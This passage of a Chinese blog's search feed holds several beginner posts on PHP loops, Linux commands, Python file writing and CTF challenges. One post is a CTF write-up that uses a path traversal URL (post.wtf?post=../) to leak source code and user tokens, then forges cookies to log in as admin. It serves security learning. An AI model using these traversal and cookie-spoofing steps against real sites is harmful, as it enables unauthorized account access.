operator">&amp;</span><span class="token shell-comment comment">#125;while($num>3);</span>    <span class="token keyword">echo</span> <span class="token string">"B例子的结果："</span><span class="token punctuation">.</span><span class="token variable">$sum</span><span class="token punctuation">.</span><span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="循环结构之（for）"><a href="#循环结构之（for）" class="headerlink" title="循环结构之（for）"></a>循环结构之（for）</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">for</span><span class="token punctuation">(</span>初始化<span class="token punctuation">;</span>循环条件<span class="token punctuation">;</span>递增项<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><blockquote><p>for 语句中，“初始化”在循环开始前无条件求值一次，“循环条件”在每次循环开始前求值。如果值为 TRUE，则继续循环，执行循环体语句（执行任务）。如果值为 FALSE，则终止循环。“递增项”在每次循环之后被求值（执行）。其常用于循环执行代码块指定的次数。</p></blockquote><p>对比一下采用while语句的方式，for语句更简洁</p><h4 id="循环结构之（foreach）"><a href="#循环结构之（foreach）" class="headerlink" title="循环结构之（foreach）"></a>循环结构之（foreach）</h4><p><strong>在PHP中有一个比较特殊的循环语句</strong></p><p>在PHP中foreach循环语句，常用于遍历数组，一般有两种使用方式:不取下标、取下标。</p><p>1）只取值，不取下标</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span>数组 <span class="token keyword">as</span> 值<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>2）同时取下标和值</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span>数组 <span class="token keyword">as</span> 下标 <span class="token operator">=</span><span class="token operator">></span> 值<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>做个实验试一试：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$students</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'2010'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'令狐冲'</span><span class="token punctuation">,</span><span class="token string">'2011'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'林平之'</span><span class="token punctuation">,</span><span class="token string">'2012'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'曲洋'</span><span class="token punctuation">,</span><span class="token string">'2013'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'任盈盈'</span><span class="token punctuation">,</span><span class="token string">'2014'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'向问天'</span><span class="token punctuation">,</span><span class="token string">'2015'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'任我行'</span><span class="token punctuation">,</span><span class="token string">'2016'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'冲虚'</span><span class="token punctuation">,</span><span class="token string">'2017'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'方正'</span><span class="token punctuation">,</span><span class="token string">'2018'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'岳不群'</span><span class="token punctuation">,</span><span class="token string">'2019'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'宁中则'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//10个学生的学号和姓名，用数组存储</span><span class="token comment" spellcheck="true">//使用循环结构遍历数组,获取学号和姓名  </span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$students</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>    <span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出（打印）姓名</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><p>到了这里PHP的基本用法都已经完成了，特别鸣谢<a href="https://www.imooc.com/">https://www.imooc.com</a>的教程</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> WEB基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF中一道misc题让我明白伪加密修改</title>
      <link href="/2019/08/31/xctf-zhong-yi-dao-misc-ti-rang-wo-ming-bai-wei-jia-mi-xiu-gai/"/>
      <url>/2019/08/31/xctf-zhong-yi-dao-misc-ti-rang-wo-ming-bai-wei-jia-mi-xiu-gai/</url>
      
        <content type="html"><![CDATA[<p>XCTF中的zip文件的伪加密实在是让我遇到了很多次，这次决定趁着这次机会还是要好好的搞懂这个遇到了好多次掉坑的东西。</p><p>题目是XCTF的攻防世界的base64stego这道题，由这道题虽然是伪加密+base64加密一起.</p><p>一般的zip文件有三个部分组成：</p><p>压缩源文件数据区 + 压缩文件目录区 + 压缩源文件目录结束区（</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探腾讯云Linux操作</title>
      <link href="/2019/08/24/chu-tan-teng-xun-yun-linux-cao-zuo/"/>
      <url>/2019/08/24/chu-tan-teng-xun-yun-linux-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h1 id="在腾讯云上的Linux的初探（实验笔记）"><a href="#在腾讯云上的Linux的初探（实验笔记）" class="headerlink" title="在腾讯云上的Linux的初探（实验笔记）"></a>在腾讯云上的Linux的初探（实验笔记）</h1><p><a href="https://cloud.tencent.com/developer/labs/lab/10000">https://cloud.tencent.com/developer/labs/lab/10000</a></p><h2 id="目录操作："><a href="#目录操作：" class="headerlink" title="目录操作："></a>目录操作：</h2><p>使用mkdir命令创建目录</p><p>mkdir $HOME/testFolder</p><h2 id="切换目录："><a href="#切换目录：" class="headerlink" title="切换目录："></a>切换目录：</h2><p>使用cd命令来切换目录</p><p>cd $HOME/testFolder</p><p>切换到上一级目录</p><p>cd../</p><p>（其实我觉得此处与压缩包特别像）</p><h2 id="移动目录："><a href="#移动目录：" class="headerlink" title="移动目录："></a>移动目录：</h2><p>使用mv命令来进行对目录的移动</p><p>mv $HOME/testFolder /var/tmp</p><p>有增必有删…</p><h2 id="删除目录："><a href="#删除目录：" class="headerlink" title="删除目录："></a>删除目录：</h2><p>rm -rf /var/tmp/testFolder</p><p>（rm -rf是用来删除目录的命令）</p><h2 id="查看目录下的文件："><a href="#查看目录下的文件：" class="headerlink" title="查看目录下的文件："></a>查看目录下的文件：</h2><p>使用ls命令来查看/etc目录下的所有文件和文件夹</p><p>ls /etc</p><p>说完目录，那么接下来就是对文件的操作了</p><h1 id="文件操作："><a href="#文件操作：" class="headerlink" title="文件操作："></a>文件操作：</h1><h2 id="创建文件："><a href="#创建文件：" class="headerlink" title="创建文件："></a>创建文件：</h2><p>使用touch命令来创建文件</p><p>touch ~/testFile</p><p>执行ls命令，可以看到刚刚新建的testFile</p><p>ls ~</p><h2 id="复制文件："><a href="#复制文件：" class="headerlink" title="复制文件："></a>复制文件：</h2><p>使用cp命令复制文件</p><p>cp ~/testFile ~/testNewFile</p><h2 id="删除文件："><a href="#删除文件：" class="headerlink" title="删除文件："></a>删除文件：</h2><p>使用rm命令删除文件，然后输入y后回车确认删除</p><p>rm ~/testFile</p><h2 id="查看文件内容："><a href="#查看文件内容：" class="headerlink" title="查看文件内容："></a>查看文件内容：</h2><p>使用cat命令可以查看文件内容：（此处举的例子是查看.bash_history文件夹内容）</p><p>cat ~/.bash_history</p><h1 id="过滤，管道与重定向"><a href="#过滤，管道与重定向" class="headerlink" title="过滤，管道与重定向"></a>过滤，管道与重定向</h1><h2 id="过滤："><a href="#过滤：" class="headerlink" title="过滤："></a>过滤：</h2><p>过滤出xxx文件夹中包含xxx的记录：（此处例子是：过滤出 /etc/passwd 文件中包含 <code>root</code> 的记录）</p><p>grep ‘root’ /etc/passwd</p><p>递归地过滤出 /var/log/ 目录中包含 <code>linux</code> 的记录</p><p>grep -r ‘linux’ /var/log/</p><h2 id="管道："><a href="#管道：" class="headerlink" title="管道："></a>管道：</h2><p>Linux 中管道的作用是将上一个命令的输出作为下一个命令的输入, 像 pipe 一样将各个命令串联起来执行, 管道的操作符是 |</p><p>此处实验室举的例子是：比如, 我们可以将 cat 和 grep 两个命令用管道组合在一起</p><p>cat /etc/passwd | grep ‘root’</p><p>过滤出 /etc 目录中名字包含 <code>ssh</code> 的目录(不包括子目录)</p><p>ls /etc | grep ‘ssh’</p><h2 id="重定向："><a href="#重定向：" class="headerlink" title="重定向："></a>重定向：</h2><p>可以使用 &gt; 或 &lt; 将命令的输出重定向到一个文件中</p><p>echo ‘Hello World’ &gt; ~/test.txt</p><h1 id="4-运维常用命令"><a href="#4-运维常用命令" class="headerlink" title="4.运维常用命令"></a>4.运维常用命令</h1><h2 id="ping命令："><a href="#ping命令：" class="headerlink" title="ping命令："></a>ping命令：</h2><p>对 cloud.tencent.com 发送 4 个 ping 包, 检查与其是否联通</p><p>ping -c 4 cloud.tencent.com</p><h2 id="netstat命令："><a href="#netstat命令：" class="headerlink" title="netstat命令："></a>netstat命令：</h2><p>netstat 命令用于显示各种网络相关信息，如网络连接, 路由表, 接口状态等等</p><p>列出所有处于监听状态的tcp端口</p><p>netstat -lt</p><p>查看所有的端口信息, 包括 PID 和进程名称</p><p>netstat -tulpn</p><h2 id="PS命令："><a href="#PS命令：" class="headerlink" title="PS命令："></a>PS命令：</h2><p>过滤得到当前系统中的 ssh 进程信息</p><p>ps aux | grep ‘ssh’</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>something easy in SUCTF</title>
      <link href="/2019/08/17/something-easy-in-suctf/"/>
      <url>/2019/08/17/something-easy-in-suctf/</url>
      
        <content type="html"><![CDATA[<p>emmmm今天开始看了看这场比赛，觉得还是挺适合小菜鸡的，于是打了打几道简单题</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>首先出现的是这个样子，分析了一下有A-Z,a-z，0-9，+，-，预判是base64</p><p><img src="1.png"></p><p>但是后来有大佬说，是不是少了点东西，补一个头就好 了</p><p><img src="2.png"></p><p>emmmm，接着就可以解出来了…一个图片</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h3 id="sign1"><a href="#sign1" class="headerlink" title="sign1"></a>sign1</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一道类似csaw-ctf-2016-quals-wtf-sh-150的xctf上的题</title>
      <link href="/2019/08/16/ji-lu-yi-dao-lei-si-csaw-ctf-2016-quals-wtf-sh-150-de-xctf-shang-de-ti-1/"/>
      <url>/2019/08/16/ji-lu-yi-dao-lei-si-csaw-ctf-2016-quals-wtf-sh-150-de-xctf-shang-de-ti-1/</url>
      
        <content type="html"><![CDATA[<h1 id="记录一道类似csaw-ctf-2016-quals-wtf-sh-150的xctf上的题（一）"><a href="#记录一道类似csaw-ctf-2016-quals-wtf-sh-150的xctf上的题（一）" class="headerlink" title="记录一道类似csaw-ctf-2016-quals-wtf.sh-150的xctf上的题（一）"></a>记录一道类似csaw-ctf-2016-quals-wtf.sh-150的xctf上的题（一）</h1><p>这道题小菜鸡真的不会啊，真的不会啊！</p><p>最后大佬看不下去了，丢了一个wp给我让我自学（有两个flag）</p><h1 id="第一个flag："><a href="#第一个flag：" class="headerlink" title="第一个flag："></a>第一个flag：</h1><p>首先登录网站，发现这个并不简单，</p><p>flag1的环境是一个论坛网站，有登录、注册、发文章、评论的功能。</p><p>在展示页面post.wtf下可以发现穿越漏洞，可以获得源码：</p><p><a href="http://111.198.29.45:36532/post.wtf?post=../">http://111.198.29.45:36532/post.wtf?post=../</a></p><p>接着就是找到源码中的flag</p><p><img src="3.png"></p><p>`<br>$ source user_functions.sh </p><link rel="stylesheet" type="text/css" href="/css/std.css"> <p>$ if contains ‘user’ ${!URL_PARAMS[@]} &amp;&amp; file_exists “users/${URL_PARAMS[‘user’]}” </p><p>$ then </p><p>$ local username=$(head -n 1 users/${URL_PARAMS[‘user’]});</p><p>$ echo “</p><h3>${username}’s posts:</h3>“;<p></p><p>$ echo “</p><ol>“;<p></p><p>$ get_users_posts “${username}” | while read -r post;do<br>   $ post_slug=$(awk -F/ ‘{print $2 “#” $3}’ &lt;&lt;&lt; “${post}”);<br>   $ echo “</p><li>&lt;ahref="/post.wtfpost=${post_slug}"&gt;$(nth_line 2 “${post}” | htmlentities)</li>“;<p></p><p>   $ done<br>   $ echo “</p></ol>“;<br>   $ if is_logged_in &amp;&amp; [[ “${COOKIES[‘USERNAME’]}” = ‘admin’ ]] &amp;&amp; [[ ${username} = ‘admin’ ]] <p></p><p>   $ then </p><p>   $ get_flag1 </p><p>   $ fi</p><p>   $ fi </p>   `<p>   进入审计代码的部分</p><p>   发现其中有一句</p><pre><code>` $ if is_logged_in &amp;&amp; [[ "$&amp;#123;COOKIES['USERNAME']&amp;#125;" = 'admin' ]] &amp;&amp; [[ $&amp;#123;username&amp;#125; = 'admin' ]]  $ then  $ get_flag1 `</code></pre><p>   嗯，只要登录admin账号就可以获得flag1了</p><p>  那么就可以先注册登录一下，发现cookie：</p><p><img src="1.png"></p><p>  在泄露的源码中可以发现有user目录</p><p>  继续尝试路径穿越</p><p><img src="2.png"></p><p>  发现自己的账号以及管理员admin都被显示出来了，然后与之前的cookie相比较一下，后面发现就是TOKEN的值</p><p>  既然admin的TOKEN值已经知道了，于是就可以进行cookie值欺骗。</p><p><img src="4.png"></p><p>画红圈的是登录admin的三个条件，然后是查看profile的文件</p><p>接着就可以得到前半段的flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF-WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python中的读写</title>
      <link href="/2019/08/16/python-zhong-de-du-xie/"/>
      <url>/2019/08/16/python-zhong-de-du-xie/</url>
      
        <content type="html"><![CDATA[<p>写文件是三步：打开文件——写入文件——关闭文件。</p><p>写：打开文件—写文件—关闭文件</p><p>第一步：</p><p>打开文件</p><p>file1 = open(‘/Users/Ted/Desktop/test/abc.txt’,’w’,encoding=’utf-8’) </p><p>—-以写入的模式打开文件“abc.txt”</p><p>open()—括号中还是三个参数，“w”是表示write，即写入的模式</p><p>第二步：</p><p>写</p><p>`file1.write(‘xxw\n’)</p><p>file1.write(‘xxx\n’)`</p><p>这两行代码的意思是往“abc.txt”文件中写入xxw和xxx两个字符串，同时\n是表示另起一行。</p><p>同时需要记住，此处的“w”即写入模式会给你暴力 清空掉文件，然后再给你写入，但是如果不想被完全覆盖掉原来的文件的话，需要用‘a’的模式，即表示append—-追加的意思</p><p>第三步：</p><p>关</p><p><code>file1.close()</code></p><p><img src="F:\blog\source_posts\python中的读写\2.png" alt="2"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
